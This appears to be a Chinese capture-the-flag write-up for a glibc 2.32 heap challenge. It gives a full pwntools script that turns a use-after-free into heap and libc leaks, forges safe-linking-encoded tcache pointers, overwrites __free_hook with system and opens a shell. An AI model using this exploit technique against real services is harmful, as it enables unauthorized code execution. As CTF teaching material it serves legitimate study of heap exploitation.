# safe_note

## 题目简述

程序提供 note 的申请、释放、编辑和查看功能，释放后指针仍可继续使用，形成 UAF。运行环境为 glibc 2.32，tcache 链表启用了 safe-linking；目标是先泄露堆与 libc，再正确编码伪造的 tcache `next`，把 `__free_hook` 改为 `system`。

## 解题过程

先准备八个 `0x90` 大小的 chunk 和一个 `0x20` chunk。连续释放八个大 chunk 后，前七个填满 tcache，最后一个进入 unsorted bin：

```python
from pwn import ELF, context, p64, remote, u64

context.arch = "amd64"
HOST = "challenge.example"
PORT = 31337
io = remote(HOST, PORT)
libc = ELF("./libc.so.6", checksec=False)


def add(index: int, size: int) -> None:
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())


def delete(index: int) -> None:
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def edit(index: int, content: bytes) -> None:
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendafter(b"Content: ", content)


def show(index: int) -> None:
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"Index: ", str(index).encode())


for index in range(8):
    add(index, 0x90)
add(8, 0x20)

for index in range(8):
    delete(index)
```

利用释放后仍可编辑和查看的 chunk 0，覆盖 tcache entry 的 `next` 后读取相邻 key 字段，得到堆地址。该题对应 libc 下使用的校正值为 `0x0a`：

```python
edit(0, b"a" * 8)
show(0)
io.recvuntil(b"a" * 8)
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x0A
```

unsorted bin 中的指针通常指向 `main_arena+96`。该地址最低字节恰好是 `0x00`，字符串式泄露会提前终止，所以先把 chunk 7 的首字节改为 `a`，再按被改写后的低字节计算基址，最后恢复：

```python
edit(7, b"a")
show(7)
libc_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x1E3C61
edit(7, b"\x00")

free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
```

safe-linking 保存 tcache 指针时使用：

$$
\text{encoded}=\text{target}\oplus(\text{chunk\_address}\gg12).
$$

准备两个 `0x20` chunk，释放后通过 UAF 把链表下一项改为编码后的 `__free_hook`：

```python
add(9, 0x20)
add(10, 0x20)
delete(8)
delete(9)

edit(10, b"/bin/sh\x00")
edit(9, p64(free_hook ^ (heap_base >> 12)))

add(11, 0x20)
add(12, 0x20)
edit(12, p64(system))
delete(10)
io.interactive()
```

第二次申请取得 `__free_hook`，写入 `system` 后释放保存 `/bin/sh` 的 chunk，即可取得 shell 并读取 `/flag`。

## 方法总结

safe-linking 不是完整的堆完整性保护；一旦堆地址泄露，攻击者仍能计算合法编码指针。解题时应分别处理两个泄露障碍：从 tcache 元数据取得堆基址，以及通过单字节覆盖绕过 `main_arena` 指针中的空字节。所有 libc 偏移都与题目提供的具体版本绑定。
